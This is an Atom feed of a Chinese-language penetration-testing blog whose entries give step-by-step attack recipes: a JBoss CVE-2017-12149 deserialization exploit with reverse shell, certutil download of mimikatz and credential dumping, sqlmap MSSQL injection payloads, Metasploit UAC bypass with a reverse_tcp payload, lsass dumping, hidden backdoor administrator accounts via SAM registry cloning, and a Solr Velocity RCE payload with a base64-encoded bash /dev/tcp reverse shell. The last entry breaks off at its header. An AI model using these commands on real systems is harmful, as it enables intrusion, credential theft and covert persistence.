<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sriracha :)</title>
  
  <subtitle>Wow, the smell is great!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-11-11T05:40:38.251Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>sher10ck</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>JBoss AS 6.X 反序列化漏洞+getshell+实战(CVE-2017-12149)</title>
    <link href="http://yoursite.com/2019/11/11/JBosS-AS-6-X-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2017-12149/"/>
    <id>http://yoursite.com/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/</id>
    <published>2019-11-11T04:22:06.000Z</published>
    <updated>2019-11-11T05:40:38.251Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>CVE编号：CVE-2017-12149<br>影响版本：影响版本为JBoss5.x-6.x<br>漏洞描述：JBOSSApplication Server反序列化命令执行漏洞(CVE-2017-12149)，远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞危害程度为高危(High)。</p><a id="more"></a><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>(Kali上一直复现不成功，这里我就用了两台ubuntu做实验)<br>攻击目标：192.168.43.131<br>攻击机器：192.168.43.140</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JBOSS 下载地址：http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip</span><br></pre></td></tr></table></figure><p>解压，编辑：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jboss-6.1.0.Final/server/default/deploy/jbossweb.sar/server.xml</span><br></pre></td></tr></table></figure></p><p>设置为允许远程访问<br><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/xml.png" alt></p><p>用nmap扫描服务器，发现8080端口<br><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/nmap.png" alt></p><p>访问 <strong><a href="http://192.168.43.131:8080" target="_blank" rel="noopener">http://192.168.43.131:8080</a></strong><br><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/8080.png" alt><br>长这个样子</p><p>然后访问 <strong>/invoker/readonly</strong> 这个位置<br><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/invoke.png" alt><br>返回500证明存在漏洞</p><p>首先用java的利用工具验证一下<br><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/linux.png" alt></p><p>这里可以执行命令了，但是还不能反弹shell</p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p><a href="https://github.com/joaomatosf/JavaDeserH2HC" target="_blank" rel="noopener">https://github.com/joaomatosf/JavaDeserH2HC</a><br>下载这个JavaDeserH2HC工具，解压，进入目录下，然后运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsH</span><br><span class="line">ashMap.java</span><br><span class="line"></span><br><span class="line">java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsH</span><br><span class="line">ashMap targetip:port</span><br></pre></td></tr></table></figure></p><p>在本地监听端口：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 12345</span><br></pre></td></tr></table></figure></p><p>然后运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://target:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/shell.png" alt><br>拿到shell</p><p>fofa一下的成果<br><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/ali.png" alt></p><p>然后发现就是system权限哦，服务器搭建一个apache，上传mimikatz<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://xxxxx/mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &apos;20&apos; OK</span><br><span class="line"></span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/mimikatz.png" alt><br><img src="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/3389.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h1&gt;&lt;p&gt;CVE编号：CVE-2017-12149&lt;br&gt;影响版本：影响版本为JBoss5.x-6.x&lt;br&gt;漏洞描述：JBOSSApplication Server反序列化命令执行漏洞(CVE-2017-12149)，远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞危害程度为高危(High)。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>通过sqlmap学习mssql注入</title>
    <link href="http://yoursite.com/2019/11/10/%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87sqlmap%E5%AD%A6%E4%B9%A0mssql%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2019/11/10/如何通过sqlmap学习mssql注入/</id>
    <published>2019-11-10T07:21:52.000Z</published>
    <updated>2019-11-10T11:10:48.540Z</updated>
    
    <content type="html"><![CDATA[<p>实验环境：<br>windows 2008 + sql server 2008 + IIS7.5</p><h1 id="mysql和mssql注入"><a href="#mysql和mssql注入" class="headerlink" title="mysql和mssql注入"></a>mysql和mssql注入</h1><p>之前写过一篇<a href="https://mp.weixin.qq.com/s/jVN48BRYb9pECjk9SAuXpA" title="https://mp.weixin.qq.com/s/jVN48BRYb9pECjk9SAuXpA" target="_blank" rel="noopener">聊一聊 SQLMAP 在进行 sql 注入时的整个流程</a>，文中主要介绍了mysql环境下sqlmap注入的整体流程。对于mssql的注入，sqlmap其实也是换汤不换药，整体流程我会在接下来的文章中一一道出。</p><h1 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h1><p>sqlmap判断依然是按照下面几个点来进行的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--technique=TECH..  SQL injection techniques to use (default &quot;BEUSTQ&quot;)</span><br><span class="line">B: Boolean-based blind SQL injection（布尔型注入）</span><br><span class="line">E: Error-based SQL injection（报错型注入）</span><br><span class="line">U: UNION query SQL injection（可联合查询注入）</span><br><span class="line">S: Stacked queries SQL injection（可多语句查询注入）</span><br><span class="line">T: Time-based blind SQL injection（基于时间延迟注入）</span><br><span class="line">Q: inline_query SQL injection(内联注入)</span><br></pre></td></tr></table></figure></p><p>我将注入点扔进sqlmap，判断出的注入类型：<br><img src="/2019/11/10/如何通过sqlmap学习mssql注入/panduan.png" alt></p><h1 id="判断基本信息"><a href="#判断基本信息" class="headerlink" title="判断基本信息"></a>判断基本信息</h1><p>为了方便查看sql语句，这里用burp suite设置代理抓包，sqlmap中添加参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--proxy=&apos;http://127.0.0.1:8080&apos;</span><br></pre></td></tr></table></figure></p><h2 id="基本信息查询"><a href="#基本信息查询" class="headerlink" title="基本信息查询"></a>基本信息查询</h2><p>首先我们来看下当前的用户<br><img src="/2019/11/10/如何通过sqlmap学习mssql注入/currentuser.png" alt><br>判断出来用户为sa，我这里将payload解码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 UNION ALL SELECT NULL,CHAR(113)+CHAR(113)+CHAR(106)+CHAR(98)+CHAR(113)+ISNULL(CAST(SYSTEM_USER AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(122)+CHAR(113),NULL-- mJCg</span><br></pre></td></tr></table></figure></p><p>这里可以看出sqlmap利用了联合查询注入的方式，我们将他分解开来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#首先可以看出sqlmap是判断出列的数量为3</span><br><span class="line">id=1 UNION ALL SELECT NULL,NULL,NULL--</span><br><span class="line">#然后将第二个NULL的值替换成</span><br><span class="line">CHAR(113)+CHAR(113)+CHAR(106)+CHAR(98)+CHAR(113)+ISNULL(CAST(SYSTEM_USER AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(122)+CHAR(113)</span><br></pre></td></tr></table></figure></p><p>我们再次分解这个NULL的值<br><img src="/2019/11/10/如何通过sqlmap学习mssql注入/char.png" alt><br><img src="/2019/11/10/如何通过sqlmap学习mssql注入/sa.png" alt><br>关键能查出信息的还是ISNULL这句话<br><img src="/2019/11/10/如何通过sqlmap学习mssql注入/isnull.png" alt><br><img src="/2019/11/10/如何通过sqlmap学习mssql注入/cast.png" alt><br>所以这里首先是将 <strong>SYSTEM_USER</strong> 转换成了char类型，这个时候ISNULL中的两个value都是char，然后就会返回第一个的值，也就是我们的SYSTEM_USER<br><img src="/2019/11/10/如何通过sqlmap学习mssql注入/cast.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 UNION ALL SELECT NULL,CHAR(113)+CHAR(113)+CHAR(106)+CHAR(98)+CHAR(113)+ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(122)+CHAR(113),NULL-- zZox</span><br></pre></td></tr></table></figure></p><p>同理sqlmap还可以查询(替换SYSTEM_USER)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DB_NAME()//当前数据库</span><br><span class="line">@@SERVERNAME//主机名</span><br></pre></td></tr></table></figure></p><p>(这里抛出一个问题让大家思考，sqlmap注入中一长串char字符是用来干什么的)</p><p>由于篇幅原因，这里贴出sqlmap检测中一些语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select name FROM sys.sql_logins//查询所有用户</span><br><span class="line">select master.dbo.fn_varbintohexstr(password_hash)FROM sys.sql_logins//查询所有的密码</span><br><span class="line">select IS_SRVROLEMEMBER(xxxx)//判断是否为dba权限</span><br></pre></td></tr></table></figure></p><h2 id="xp-shell"><a href="#xp-shell" class="headerlink" title="xp_shell"></a>xp_shell</h2><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>启动/关闭xp_cmdshell：<a href="https://www.cnblogs.com/songsz1/archive/2012/12/26/2833856.html" target="_blank" rel="noopener">https://www.cnblogs.com/songsz1/archive/2012/12/26/2833856.html</a></p><p>《Windows server 2008 r2》配置IIS7+asp.net：<a href="https://blog.csdn.net/liang_operations/article/details/89980023" target="_blank" rel="noopener">https://blog.csdn.net/liang_operations/article/details/89980023</a></p><p>SQL Server xtype的介绍：<a href="https://www.2cto.com/database/201307/230722.html" target="_blank" rel="noopener">https://www.2cto.com/database/201307/230722.html</a></p><p>MSSQL注入提权的一些方法：<a href="https://www.cnblogs.com/FayJack/archive/2013/05/13/3075697.html" target="_blank" rel="noopener">https://www.cnblogs.com/FayJack/archive/2013/05/13/3075697.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;实验环境：&lt;br&gt;windows 2008 + sql server 2008 + IIS7.5&lt;/p&gt;
&lt;h1 id=&quot;mysql和mssql注入&quot;&gt;&lt;a href=&quot;#mysql和mssql注入&quot; class=&quot;headerlink&quot; title=&quot;mysql和mssq
      
    
    </summary>
    
    
    
      <category term="注入" scheme="http://yoursite.com/tags/%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Windows下bypassuac</title>
    <link href="http://yoursite.com/2019/11/08/Windows%E4%B8%8Bbypassuac/"/>
    <id>http://yoursite.com/2019/11/08/Windows下bypassuac/</id>
    <published>2019-11-08T11:27:00.000Z</published>
    <updated>2019-11-09T10:14:33.579Z</updated>
    
    <content type="html"><![CDATA[<p>一直都搞不懂bypassuac是啥，到底有啥用啊，后来经过高人的指点，突然之间就悟了！<br><a id="more"></a></p><h1 id="uac"><a href="#uac" class="headerlink" title="uac"></a>uac</h1><p>有的时候我们拿了一个shell，不晓得管理员的密码，3389也打不开是不是很操刀！就像这样<br><img src="/2019/11/08/Windows下bypassuac/error.png" alt><br>这个问题是要用管理员打开cmd才能添加账号<br><img src="/2019/11/08/Windows下bypassuac/cmd_1.png" alt><br><img src="/2019/11/08/Windows下bypassuac/cmd_2.png" alt><br>这个时候我们就要绕过windows的uac策略了</p><h1 id="Msf-bypassuac"><a href="#Msf-bypassuac" class="headerlink" title="Msf bypassuac"></a>Msf bypassuac</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#生成一个木马文件，放到目标机器上面</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.43.128 --platform windows lport=4444 -f exe &gt; uac.exe</span><br><span class="line"></span><br><span class="line">#打开msfconsole，设置监听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.43.128</span><br><span class="line">run</span><br><span class="line">#然后在目标机器上面运行传上去的木马文件</span><br></pre></td></tr></table></figure><p>这个时候我们拿到了meterpreter<br><img src="/2019/11/08/Windows下bypassuac/getsystem_1.png" alt></p><p>getsystem是有问题的，说明不是最高权限</p><p>这个时候我们返回msf控制台，并保留session<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#设置uac的payload</span><br><span class="line">use exploit/windows/local/bypassuac</span><br><span class="line">set session 3</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/2019/11/08/Windows下bypassuac/getsystem_2.png" alt><br>这个时候getsystem应该没有问题了<br><img src="/2019/11/08/Windows下bypassuac/success.png" alt></p><p>bypassuac成功，可以添加用户了</p><h1 id="cobalt-strike-bypassuac"><a href="#cobalt-strike-bypassuac" class="headerlink" title="cobalt strike bypassuac"></a>cobalt strike bypassuac</h1><p><img src="/2019/11/08/Windows下bypassuac/shell.png" alt><br>一样的，首先生成一个后门木马，上传到目标机器上面，并且运行<br><img src="/2019/11/08/Windows下bypassuac/sherl.png" alt><br>看到这里有回显了，右键进入beacon，输入bypassuac<br><img src="/2019/11/08/Windows下bypassuac/csbypass.png" alt><br>然后设置好监听的端口，输入命令<br><img src="/2019/11/08/Windows下bypassuac/cs.png" alt><br>就成功啦~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一直都搞不懂bypassuac是啥，到底有啥用啊，后来经过高人的指点，突然之间就悟了！&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>使用procdump64和mimikatz抓取Windows用户密码</title>
    <link href="http://yoursite.com/2019/11/08/%E4%BD%BF%E7%94%A8procdump64%E5%92%8Cmimikatz%E6%8A%93%E5%8F%96Windows%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81/"/>
    <id>http://yoursite.com/2019/11/08/使用procdump64和mimikatz抓取Windows用户密码/</id>
    <published>2019-11-08T08:52:49.000Z</published>
    <updated>2019-11-09T10:15:24.383Z</updated>
    
    <content type="html"><![CDATA[<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>今天在渗透的时候，利用mimikata抓取用户密码报错了，很曹丹，于是就有了这篇文章<br><a id="more"></a><br><img src="/2019/11/08/使用procdump64和mimikatz抓取Windows用户密码/error.png" alt><br>报错：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)</span><br></pre></td></tr></table></figure></p><h1 id="解决方式"><a href="#解决方式" class="headerlink" title="解决方式"></a>解决方式</h1><p>利用procdump64+mimikatz解决，前提是windows要运行了lsass.exe<br><img src="/2019/11/08/使用procdump64和mimikatz抓取Windows用户密码/lsass.png" alt></p><p>并且命令要在cmd右键管理员身份运行，这里就要bypassuac了，不然运行命令会保存</p><p>lsass.exe用户安全和登陆策略，我们要通过procdump64读取其中的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure></p><p>然后用mimikatz读取这个生成的文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure></p><p>就成功了</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;问题&quot;&gt;&lt;a href=&quot;#问题&quot; class=&quot;headerlink&quot; title=&quot;问题&quot;&gt;&lt;/a&gt;问题&lt;/h1&gt;&lt;p&gt;今天在渗透的时候，利用mimikata抓取用户密码报错了，很曹丹，于是就有了这篇文章&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Windows下两个隐藏后门用户的小技巧</title>
    <link href="http://yoursite.com/2019/11/06/Windows%E4%B8%8B%E4%B8%A4%E4%B8%AA%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    <id>http://yoursite.com/2019/11/06/Windows下两个隐藏后门用户的小技巧/</id>
    <published>2019-11-06T12:20:56.000Z</published>
    <updated>2019-11-09T10:16:28.748Z</updated>
    
    <content type="html"><![CDATA[<p>我们在渗透的过程中拿到权限之后想要植入后门(3389登陆)，net命令添加用户还是太明显了，无论是net user 或者登陆的时候都能看见我们创建的后门账号，今天碰巧看了篇实战文章，记录个留后门的小技巧<br><a id="more"></a></p><h1 id="用户后面添加"><a href="#用户后面添加" class="headerlink" title="用户后面添加$"></a>用户后面添加$</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">net user defaultuser0$ somepasswordhere /add /y</span><br><span class="line">net localgroup administrators defaultuser0$ /add</span><br><span class="line">net localgroup &quot;remote desktop users&quot; defaultuser0$ /add</span><br></pre></td></tr></table></figure><p>这样我们在net user的时候我们添加的用户就不会被显示出来了<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/user.png" alt><br>不过在登陆的时候这个账号还是显示出来了<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/login.png" alt></p><h1 id="修改注册表"><a href="#修改注册表" class="headerlink" title="修改注册表"></a>修改注册表</h1><p>regedit打开注册表，然后找到HKEY_LOCAL_MACHINE\SAM\SAM,右键点击权限，将读写权限赋予 administrator<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/sam.png" alt><br>重新打开注册表(这里不重新打开，sam目录下的内容无法展开)</p><p>将 administrator 对应目录中的F值复制到后门用户对应目录中的F值<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/f.png" alt><br>复制完成后，把 defaultuser0$ 和其对应的 0000003EC 目录导出并保存(这里不一定是3EC，具体你看你用户的类型)<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/export.png" alt><br>然后删除刚才的后门用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user defaultuser0$ /del</span><br></pre></td></tr></table></figure><p><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/login_2.png" alt><br>这里defaultuser0$就没有了</p><p>然后我们远程桌面连接，输入后门的账号密码就行了</p><p>不过据说这两种方法都不是很安全，还待后续挖掘更多的后门小技巧</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我们在渗透的过程中拿到权限之后想要植入后门(3389登陆)，net命令添加用户还是太明显了，无论是net user 或者登陆的时候都能看见我们创建的后门账号，今天碰巧看了篇实战文章，记录个留后门的小技巧&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="后门" scheme="http://yoursite.com/tags/%E5%90%8E%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>Solr Velocity模板远程命令执行漏洞+反弹shell</title>
    <link href="http://yoursite.com/2019/11/04/Solr-Velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2019/11/04/Solr-Velocity模板远程命令执行漏洞/</id>
    <published>2019-11-04T07:15:33.000Z</published>
    <updated>2019-11-04T08:23:23.080Z</updated>
    
    <content type="html"><![CDATA[<p>这个漏洞出来好几天了一直没有时间进行复现</p><p>漏洞需要java的环境，这里我就直接在kali上进行搭建了<br><a id="more"></a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>首先下载源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/8.2.0/solr-8.2.0.tgz</span><br></pre></td></tr></table></figure></p><p>解压之后进入bin目录下，运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./solr create_core -c alice -d ../example/example-DIH/solr/db -force</span><br></pre></td></tr></table></figure></p><p>这里是新建了一个alice的core，然后启用环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./solr start -force</span><br></pre></td></tr></table></figure></p><p>默认端口是8983，我们访问这个地址，然后在core admin中找到了alice<br><img src="/2019/11/04/Solr-Velocity模板远程命令执行漏洞/alice.png" alt></p><p>每一个我们新建的core都有配置信息<br><img src="/2019/11/04/Solr-Velocity模板远程命令执行漏洞/config.png" alt></p><p>这里我们要修改一下配置，我们要将params.resource.loader.enabled这个参数设置为true，默认为false，才能触发漏洞，post提交下面的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">   &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">   &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">   &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;:&quot;&quot;,</span><br><span class="line">   &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">   &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/04/Solr-Velocity模板远程命令执行漏洞/post.png" alt><br>返回200，说明修改成功</p><p>漏洞环境就搭建到这里啦</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.128:8983/solr/alice/select?q=1&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/04/Solr-Velocity模板远程命令执行漏洞/id.png" alt></p><p>这样就可以执行命令了，github上也有很多利用的脚本</p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>这里好像和之前泛微oa的命令执行是一样的，利用了getRuntime().exec()这个函数来执行命令，但是这个函数有一些特性，可以看下面的文章和内容<br><a href="https://mp.weixin.qq.com/s/ZS-hA03ykKleDjgN8oWZDw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ZS-hA03ykKleDjgN8oWZDw</a><br><img src="/2019/11/04/Solr-Velocity模板远程命令执行漏洞/runtime.png" alt></p><p>所以我们直接执行命令的时候不能使用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure></p><p>而是要利用base64编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS8yMSAwPiYxIA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure></p><p>这里我们来实验一下：<br>目标机器:192.168.43.128<br>攻击机器:192.168.43.1</p><p>首先在攻击机器上设置nc监听端口<br><img src="/2019/11/04/Solr-Velocity模板远程命令执行漏洞/nc.png" alt></p><p>然后将我们反弹shell的bash命令进行base64编码：<br><img src="/2019/11/04/Solr-Velocity模板远程命令执行漏洞/base64.png" alt></p><p>然后进行一次url编码<br><img src="/2019/11/04/Solr-Velocity模板远程命令执行漏洞/url.png" alt></p><p>构造后的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%27bash+-c+%7becho%2cYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjQzLjEvMTEyMzMgMD4mMQ%3d%3d%7d%7c%7bbase64%2c-d%7d%7c%7bbash%2c-i%7d%27</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/04/Solr-Velocity模板远程命令执行漏洞/success.png" alt><br>这样我们就能反弹shell了<br>脚本就不写咯<br>:)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个漏洞出来好几天了一直没有时间进行复现&lt;/p&gt;
&lt;p&gt;漏洞需要java的环境，这里我就直接在kali上进行搭建了&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Linux PTRACE_TRACEME 本地提权漏洞复现</title>
    <link href="http://yoursite.com/2019/10/21/Linux-PTRACE-TRACEME-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/10/21/Linux-PTRACE-TRACEME-本地提权漏洞复现/</id>
    <published>2019-10-21T05:08:12.000Z</published>
    <updated>2019-10-21T05:17:14.571Z</updated>
    
